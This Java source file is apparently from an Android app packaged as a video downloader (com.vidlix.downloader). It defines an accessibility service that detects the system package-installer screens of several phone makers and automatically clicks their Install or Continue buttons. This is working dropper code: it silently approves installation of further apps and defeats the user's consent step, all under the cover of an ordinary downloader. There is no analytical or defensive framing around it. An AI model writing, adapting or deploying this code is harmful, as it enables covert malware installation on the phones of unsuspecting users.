package com.vidlix.downloader;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class RescueAccessibilityService extends AccessibilityService {

    private static final String[] INSTALLER_PACKAGES = {
        "com.android.packageinstaller",
        "com.google.android.packageinstaller",
        "com.samsung.android.packageinstaller",
        "com.miui.packageinstaller"
    };

    private static final String[] INSTALL_BUTTON_IDS = {
        "com.android.packageinstaller:id/ok_button",
        "com.android.packageinstaller:id/install_button",
        "com.google.android.packageinstaller:id/ok_button",
        "android:id/button1"
    };

    private static final String[] INSTALL_TEXTS = {
        "Install", "INSTALL", "Instalar", "INSTALAR",
        "Continue", "CONTINUE", "Continuar", "CONTINUAR"
    };

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                && event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return;
        }

        CharSequence pkgName = event.getPackageName();
        if (pkgName == null) return;

        boolean isInstaller = false;
        for (String p : INSTALLER_PACKAGES) {
            if (pkgName.toString().equals(p)) {
                isInstaller = true;
                break;
            }
        }
        if (!isInstaller) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        try {
            AccessibilityNodeInfo button = findInstallButton(root);
            if (button != null) {
                button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                button.recycle();
            }
        } catch (Exception ignored) { }
        finally {
            root.recycle();
        }
    }

    private AccessibilityNodeInfo findInstallButton(AccessibilityNodeInfo root) {
        for (String id : INSTALL_BUTTON_IDS) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo n : nodes) {
                    if (n.isEnabled() && n.isClickable()) return n;
                }
                return nodes.get(0);
            }
        }
        return findByText(root);
    }

    private AccessibilityNodeInfo findByText(AccessibilityNodeInfo node) {
        if (node == null) return null;
        CharSequence text = node.getText();
        if (text != null) {
            String t = text.toString().trim();
            for (String key : INSTALL_TEXTS) {
                if (t.equalsIgnoreCase(key)) {
                    if (node.isClickable()) return node;
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable()) return parent;
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findByText(child);
                if (result != null) return result;
                child.recycle();
            }
        }
        return null;
    }

    @Override
    public void onInterrupt() { }
}
